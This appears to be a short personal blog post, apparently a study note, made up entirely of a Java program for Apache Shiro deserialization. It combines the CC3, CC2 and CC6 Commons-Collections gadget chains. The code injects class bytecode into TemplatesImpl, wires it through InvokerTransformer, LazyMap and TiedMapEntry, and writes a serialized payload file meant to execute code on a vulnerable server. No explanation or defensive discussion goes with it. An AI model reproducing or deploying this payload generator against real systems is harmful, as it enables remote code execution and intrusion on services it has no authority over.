---
title: ShiroCC
date: 2026-03-08 14:04:11
updated: 2026-03-08 14:04:38
tags:
  - Web
  - java
  - 反序列化
  - Shiro
---
# CC3+CC2+CC6

```java
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class withoutCC {
    public static void main(String[] args) throws Exception {
        //CC3
        String clazzpath = "/Users/bigcolaxd/IdeaProjects/java_study/CC/target/classes/Exec.class";

        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodes = templates.getClass().getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get(clazzpath));
        byte[][] codes = {code};
        bytecodes.set(templates, codes);

        Field name = templates.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "1");
        //CC2
        InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        //CC6
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        Transformer fakeTransformer = new ChainedTransformer(new Transformer[]{});
        Map Lazymap = LazyMap.decorate(hashMap1, fakeTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(Lazymap, templates);

        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap2.put(tiedMapEntry,1);
        hashMap1.remove(templates);
        Class c = Lazymap.getClass();
        Field factory = c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(Lazymap,newTransformer);

        serialize(hashMap2);
        //unserialize("bin.ser");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}

```